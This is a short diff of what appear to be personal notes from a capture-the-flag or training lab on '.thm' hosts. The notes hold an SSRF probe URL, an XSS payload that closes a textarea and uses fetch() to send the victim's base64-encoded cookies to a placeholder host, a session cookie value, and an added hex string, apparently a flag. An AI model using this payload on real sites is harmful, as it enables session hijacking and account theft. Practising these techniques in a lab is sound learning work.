@@ -28,3 +28,4 @@ http://website.thm/stock?server=api.website.thm/api/user&x&id=123
 #XSS
 </textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
 session=9392c12a40773afcedfd7f2ee0f3de3f
+4AB305E55955197693F01D6F8FD2D321
